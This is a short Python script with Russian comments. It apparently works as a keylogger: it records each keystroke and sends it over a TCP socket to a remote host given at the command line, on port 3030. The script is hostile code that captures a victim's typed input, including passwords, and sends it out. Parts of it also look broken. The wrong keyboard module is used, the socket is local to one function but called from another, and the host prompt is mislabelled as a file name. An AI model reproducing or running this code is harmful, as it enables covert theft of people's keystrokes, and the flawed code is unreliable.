import time
import click
import os
import sys
import keyboard
import socket

def on_press(key):
            global a 
            try:
                #print(f'Нажата буквенно-цифровая клавиша: {key.char}')
                a = key.char
                s.sendall(a.encode('utf-8'))
                data = s.recv(1024) #Получаем данные из сокета.
            except AttributeError:
                #print(f'Нажата специальная клавиша: {key}')
                a = key
                s.sendall(a.encode('utf-8'))
                data = s.recv(1024) #Получаем данные из сокета.
def on_release(key):
            #print(f'{key} released')
            if key == keyboard.Key.esc:
                
                return False
@click.command()
@click.option('-n', prompt='The name of the file')



def hello(n):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.getaddrinfo(n, 3030)
    s.connect((n, 3030))
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
            listener.join()
            listener = keyboard.Listener(
                on_press=on_press,
                on_release=on_release)
            listener.start()
            





if __name__ == '__main__':
    hello()